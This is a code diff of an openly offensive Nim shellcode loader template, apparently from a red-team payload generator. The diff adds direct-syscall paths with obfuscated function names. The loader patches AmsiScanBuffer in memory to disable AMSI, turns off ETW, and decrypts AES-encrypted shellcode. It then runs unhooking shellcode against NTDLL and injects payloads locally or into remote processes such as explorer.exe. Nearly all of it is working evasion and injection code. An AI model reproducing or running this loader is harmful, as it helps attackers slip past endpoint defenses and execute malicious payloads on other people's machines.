@@ -12,22 +12,28 @@
         https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
         https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim
 
-
         Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
         https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
+
+        Direct syscalls implemented using NimlineWhispers by Alfie Champion (@ajpc500)
+        https://github.com/ajpc500/NimlineWhispers
+
 ]#
 
 import nimcrypto
 import winim/clr except `[]`
 import winim/lean
 import winim/com
-import strformat
 import os
 import dynlib
 import base64
 import osproc
 import math
 from bitops import bitor
+
+when defined syscalls:
+    include ../templates/syscalls
+    from winlean import getCurrentProcess
 
 ### Modified code from Nim-Strenc to avoid XORing of long strings
 ### Original source: https://github.com/Yardanico/nim-strenc
@@ -60,27 +66,10 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
 
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
 #[ PLACEHOLDERCRYPTKEY ]#
-
-# Run shellcode user VirtualProtect()
-proc rscvp(payload: openArray[byte]): void =
-    var oldProtect : DWORD
-    var ret = VirtualProtect(payload.unsafeAddr, len(payload), PAGE_EXECUTE_READWRITE, oldProtect.addr)
-    when defined verbose:
-        doAssert ret != 0, "Error executing VirtualProtect()"
-    let f = cast[proc(){.nimcall.}](payload.unsafeAddr)
-    f()
-
-# Run shellcode using VirtualAlloc()
-# proc rscva(payload: openArray[byte]): void =
-#     var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-#     when defined verbose:
-#         doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
-#     copyMem(allocated, payload[0].unsafeAddr, len(payload))
-#     let f = cast[proc(){.nimcall.}](allocated)
-#     f()
+var tProcId : DWORD
 
 when defined calcPrimes:
-    proc calcPrimes(seconds: int): int {.noinline.} =
+    proc cPrim(seconds: int): int {.noinline.} =
         var finalPrime: int = 0
         var max: int = seconds * 68500
 
@@ -106,23 +95,21 @@ when defined calcPrimes:
         return finalPrime
 
 when defined patchAmsi:
-    # Get the AMSI patch bytes based on arch
-    when defined amd64:
-        when defined verbose:
-            echo "[*] Running in x64 process"
-        const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
-    elif defined i386:
-        when defined verbose:
-            echo "[*] Running in x86 process"
-        const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+    proc pAms(): bool =
+        # Get the AMSI patch bytes based on arch
+        when defined amd64:
+            when defined verbose:
+                echo "[*] Running in x64 process"
+            const aPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        elif defined i386:
+            when defined verbose:
+                echo "[*] Running in x86 process"
+            const aPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
-    proc patchAmsi(): bool =
         var
             amsi: LibHandle
-            cs: pointer
-            op: DWORD
-            t: DWORD
             disabled: bool = false
+            sbAddr: pointer
 
         amsi = loadLib("amsi")
         if isNil(amsi):
@@ -130,21 +117,44 @@ when defined patchAmsi:
                 echo "[X] Failed to load amsi.dll"
             return disabled
 
-        cs = amsi.symAddr("AmsiScanBuffer")
-        if isNil(cs):
+        sbAddr = amsi.symAddr("AmsiScanBuffer")
+        
+        if isNil(sbAddr):
             when defined verbose:
                 echo "[X] Failed to get the address of 'AmsiScanBuffer'"
             return disabled
 
-        if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
-            copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
-            VirtualProtect(cs, amsiPatch.len, op, addr t)
+        when defined syscalls:          
+            # NtProtectVirtualMemory
+            var op: ULONG
+            var pLen = cast[SIZE_T](aPatch.len)
+            var sbPageAddr = sbAddr
+            var ret = ubtkgykehoOtMXRG(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
+            doAssert ret == 0, "Error executing NtProtectVirtualMemory when setting AMSI protections."
+
+            # NtWriteVirtualMemory
+            var bytesWritten: SIZE_T
+            ret = VfSxUkLKbMoGGBeT(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
+            doAssert ret == 0, "Error executing NtWriteVirtualMemory."
+            
+            # NtProtectVirtualMemory
+            var t: ULONG
+            ret = ubtkgykehoOtMXRG(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
+            doAssert ret == 0, "Error executing NtProtectVirtualMemory when restoring AMSI protections."
+
             disabled = true
+        else:
+            var op: DWORD
+            var t: DWORD
+            if VirtualProtect(sbAddr, aPatch.len, PAGE_EXECUTE_READWRITE, addr op):
+                copyMem(sbAddr, unsafeAddr aPatch, aPatch.len)
+                VirtualProtect(sbAddr, aPatch.len, op, addr t)
+                disabled = true
 
         return disabled
 
 when defined disableEtw:
-    proc disableEtw(): void =
+    proc dEtw(): bool =
         var success : bool
         var cometw = "COMPlus_ETWEnabled"
         var setnull = "0"
@@ -153,31 +163,27 @@ when defined disableEtw:
             success = true
         else:
             success = false
-        when defined verbose:
-            echo fmt"[*] ETW disabled: {bool(success)}"
+        return success
 
 when defined patchApiCalls:
-    proc patchApiCalls(cryptedCoat: string, key: array[16, byte], iv: array[16, byte]): void =
+    # Decrypt Shellycoat shellcode
+    proc dCryptApiC(cryptedCoat: string, key: array[16, byte], iv: array[16, byte]): seq[byte] =
         let cryptedCoatBytes = toByteSeq(decode(cryptedCoat))
-
         var
             encodedCoat = newSeq[byte](len(cryptedCoatBytes))
             decodedCoat = newSeq[byte](len(cryptedCoatBytes))
-
+            
         encodedCoat = cryptedCoatBytes
         var dctx: CTR[aes128]
         dctx.init(key, iv)
         dctx.decrypt(encodedCoat, decodedCoat)
         dctx.clear()
 
-        # Remove user-mode API hooks by running ShellyCoat shellcode
-        rscvp(decodedCoat)
-        # rscva(decodedCoat)
-        when defined verbose:
-            echo "[*] User-mode API hooks removed: true"
+        return decodedCoat
 
 when defined executeAssembly:
-    proc executeAssembly(decodedPay: openArray[byte]): void =
+    proc execAsm(decodedPay: openArray[byte]): void =
+        ################################# TODO - fix issue with below
         var assembly = load(decodedPay)
 
         # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant(["argument1", "argument2"], VT_BSTR)
@@ -188,114 +194,126 @@ when defined executeAssembly:
             
         assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 
-when defined shinject:
-    proc shinject(decodedPay: openArray[byte]): void =
-        when defined verbose:
-            echo "[*] Executing shellcode in local thread..."
+when defined(shinject) or defined(patchApiCalls):
+    when defined syscalls:
+        # Run shellcode using direct syscalls for low-level APIs
+        proc rSc(payload: openArray[byte]): void =
+            # NtAllocateVirtualMemory
+            var sc_size: SIZE_T = cast[SIZE_T](payload.len)
+            var dest: LPVOID
+            var ret = tmNeIICXlJFvSEkq(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+            doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
-        # rscva(decodedPay)
-        rscvp(decodedPay)
+            # NtWriteVirtualMemory
+            var bytesWritten: SIZE_T
+            ret = VfSxUkLKbMoGGBeT(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
+            doAssert ret == 0, "Error executing NtWriteVirtualMemory."
+
+            when defined verbose:
+                echo "[*] NtWriteVirtualMemory: ", ret
+                echo "    \\-- bytes written: ", bytesWritten
+            
+            let f = cast[proc(){.nimcall.}](dest)
+            f()
+    else:
+        # Run shellcode using VirtualProtect()
+        proc rSc(payload: openArray[byte]): void =
+            var oldProtect : DWORD
+            var ret = VirtualProtect(payload.unsafeAddr, len(payload), PAGE_EXECUTE_READWRITE, oldProtect.addr)
+            doAssert ret != 0, "Error executing VirtualProtect()"
+            let f = cast[proc(){.nimcall.}](payload.unsafeAddr)
+            f()
 
 when defined remoteShinject:
-    proc injectShellcodeRemote(shellcode: openArray[byte], tprocessName: string, injectExistingProcess: bool): void =
-        var tProcessId : DWORD
+    when defined syscalls:
+        # Remote shellcode injection using syscalls
+        proc iSR(payload: openArray[byte], tProcId: int): void =
+            var rcid: CLIENT_ID
+            rcid.UniqueProcess = cast[DWORD](tProcId)
 
-        if injectExistingProcess == true:
+            # NtOpenProcess, get handle on remote process
+            var rHandle: HANDLE
+            var roa: OBJECT_ATTRIBUTES
+            var ret = ypSZHQjRZBuZvYgv(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
+            doAssert ret == 0, "Error executing NtOpenProcess (remote)."
             when defined verbose:
-                echo "[*] Injecting in existing process..."
-            
-            let wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+                echo "[*] rHandle: ", rHandle
 
-            for process in wmi.execQuery("SELECT * FROM win32_process"):
-                if process.name == tProcessName:
-                    tProcessId = process.handle
+            # NtAllocateVirtualMemory, allocate memory in remote thread
+            var rBaseAddr: LPVOID
+            var sc_size: SIZE_T = cast[SIZE_T](payload.len)
+            ret = tmNeIICXlJFvSEkq(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            doAssert ret == 0, "Error executing NtAllocateVirtualMemory."
 
-        else:
+            # NtWriteVirtualMemory, write payload to remote thread
+            var bytesWritten: SIZE_T
+            ret = VfSxUkLKbMoGGBeT(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
+            doAssert ret == 0, "Error executing NtWriteVirtualMemory."
             when defined verbose:
-                echo "[*] Injecting in new process..."
+                echo "[*] NtWriteVirtualMemory: ", ret
+                echo "    \\-- bytes written: ", bytesWritten
 
-            let tProcess = startProcess(tProcessName)
-            tProcess.suspend() 
-            defer: tProcess.close()
-            tProcessId = cast[DWORD](tProcess.processID)
+            # NtCreateThreadEx, execute shellcode from memory region in remote thread
+            var tHandle: HANDLE
+            ret = eTvGYJYHUrfXKwzj(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
+            doAssert ret == 0, "Error executing NtCreateThreadEx."
 
-        when defined verbose:
-            echo "[*] Target Process: ", tProcessName, " [", tProcessId, "]"
+            # NtClose, close the handle
+            ret = NAdBghYPVEdFHrzq(rHandle)
+            doAssert ret == 0, "Error executing NtClose (rHandle)."
+            ret = NAdBghYPVEdFHrzq(tHandle)
+            doAssert ret == 0, "Error executing NtClose (tHandle)."
+    else:
+        # Remote shellcode injection using high-level APIs
+        proc iSR(payload: openArray[byte], tProcId: int): void =
+            let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcId))
+            defer: CloseHandle(pHandle)
+            when defined verbose:
+                echo "[*] pHandle: ", pHandle
 
-        let pHandle = OpenProcess(
-            PROCESS_ALL_ACCESS, 
-            false, 
-            tProcessId
-        )
-        defer: CloseHandle(pHandle)
+            let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](payload.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
 
-        when defined verbose:
-            echo "[*] pHandle: ", pHandle
+            var bytesWritten: SIZE_T
+            let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr payload, cast[SIZE_T](payload.len), addr bytesWritten)
+            when defined verbose:
+                echo "[*] WriteProcessMemory: ", bool(wSuccess)
+                echo "    \\-- bytes written: ", bytesWritten
 
-        var commitMem : DWORD
-
-        if injectExistingProcess == true:
-            commitMem = bitor(MEM_COMMIT, MEM_RESERVE)
-        else:
-            commitMem = MEM_COMMIT
-
-        let rPtr = VirtualAllocEx(
-            pHandle,
-            NULL,
-            cast[SIZE_T](shellcode.len),
-            commitMem,
-            PAGE_EXECUTE_READ_WRITE
-        )
-
-        var bytesWritten: SIZE_T
-        let wSuccess = WriteProcessMemory(
-            pHandle, 
-            rPtr,
-            unsafeAddr shellcode,
-            cast[SIZE_T](shellcode.len),
-            addr bytesWritten
-        )
-
-        when defined verbose:
-            echo "[*] WriteProcessMemory: ", bool(wSuccess)
-            echo "    \\-- bytes written: ", bytesWritten
-            echo ""
-
-        var tHandle : HANDLE
-
-        if injectExistingProcess == true:
-            tHandle = CreateRemoteThread(
-                pHandle, 
-                NULL,
-                0,
-                cast[LPTHREAD_START_ROUTINE](rPtr),
-                NULL, 
-                NULL, 
-                NULL
-            )
+            var tHandle : HANDLE
+            tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, NULL, NULL)
             defer: CloseHandle(tHandle)
-        else:
-            tHandle = CreateRemoteThread(
-                pHandle, 
-                NULL,
-                0,
-                cast[LPTHREAD_START_ROUTINE](rPtr),
-                NULL, 
-                0, 
-                NULL
-            )
-            defer: CloseHandle(tHandle)
+            when defined verbose:
+                echo "[*] tHandle: ", tHandle
+                echo "[+] Injected"
+
+    proc rShI(decodedPay: openArray[byte]) : void =
+        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: var tProc: string = "explorer.exe"
+        #[ PLACEHOLDERTARGETPROC ]#
+        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: var nProc: bool = true
+        #[ PLACEHOLDERNEWPROC ]#
+
+        if tProcId == 0:
+            if nProc == false:
+                # Inject in existing process, get first PID with the specified name
+                when defined verbose:
+                    echo "[*] Targeting existing process..."
+                let wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+                for process in wmi.execQuery("SELECT * FROM win32_process"):
+                    if process.name == tProc:
+                        tProcId = process.handle
+            else:
+                # Inject in new process, launch new process with specified name and get PID
+                when defined verbose:
+                    echo "[*] Targeting new process..."
+                let tProcess = startProcess(tProc)
+                tProcess.suspend() 
+                defer: tProcess.close()
+                tProcId = cast[DWORD](tProcess.processID)
 
         when defined verbose:
-            echo "[*] tHandle: ", tHandle
-            echo "[+] Injected"
+            echo "[*] Target Process: ", tProc, " [", tProcId, "]"
 
-    proc remoteShinject(decodedPay: openArray[byte]) : void =
-        when defined verbose:
-            echo "[*] Executing shellcode in remote thread..."
-
-        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: injectShellcodeRemote(decodedPay, "explorer.exe", true)
-        #[ PLACEHOLDERINJECTCALL ]#
+        iSR(decodedPay, tProcId)
 
 proc mainMain() : void =
 
@@ -308,22 +326,12 @@ proc mainMain() : void =
         (key is defined separately as a const to prevent the values from being too close together)
     ]#
     #[ PLACEHOLDERCRYPTEDINPUT ]#
-    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
+    when defined patchApiCalls:
+        #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
     #[ PLACEHOLDERCRYPTIV ]#
 
     when defined calcPrimes:
-        discard calcPrimes(30)
-
-    when defined patchAmsi:
-        # Patch AMSI
-        var success : bool
-        success = patchAmsi()
-    when defined verbose:
-            echo fmt"[*] AMSI disabled: {bool(success)}"
-
-    when defined disableEtw:
-        # Disable ETW
-        disableEtw()
+        discard cPrim(30)
 
     # Prepare decryption stuff
     let cryptedInput = toByteSeq(decode(b64buf))
@@ -339,8 +347,7 @@ proc mainMain() : void =
     encodedPay = cryptedInput
 
     when defined patchApiCalls:
-        # Decrypt ShellyCoat shellcode
-        patchApiCalls(cryptedCoat, key, iv)
+        var sCoat = dCryptApiC(cryptedCoat, key, iv)
             
     # Decrypt the encrypted bytes of the main payload
     var dctx2: CTR[aes128]
@@ -349,13 +356,43 @@ proc mainMain() : void =
     dctx2.clear()
 
     when defined executeAssembly:
-        executeAssembly(decodedPay)
+        var success : bool
+        when defined patchAmsi:
+            # Patch AMSI
+            success = pAms()
+            when defined verbose:
+                echo "[*] AMSI disabled: ", success
+
+        when defined disableEtw:
+            # Disable ETW
+            success = dEtw()
+            when defined verbose:
+                echo "[*] ETW disabled: ", success
+
+        when defined patchApiCalls:
+            when defined verbose:
+                echo "[*] Executing shellycoat in local thread to unhook NTDLL..."
+            rSc(sCoat)
+
+        execAsm(decodedPay)
 
     when defined shinject:
-        shinject(decodedPay)
+        when defined patchApiCalls:
+            when defined verbose:
+                echo "[*] Executing shellycoat in local thread to unhook NTDLL..."
+            rSc(sCoat)
+        when defined verbose:
+            echo "[*] Executing shellcode in local thread..."
+        rSc(decodedPay)
 
     when defined remoteShinject:
-        remoteShinject(decodedPay)
+        when defined patchApiCalls:
+            when defined verbose:
+                echo "[*] Executing shellycoat in remote thread to unhook NTDLL..."
+            rShI(sCoat)
+        when defined verbose:
+            echo "[*] Executing shellcode in remote thread..."
+        rShI(decodedPay)
 
 when defined exportExe:
     when isMainModule:
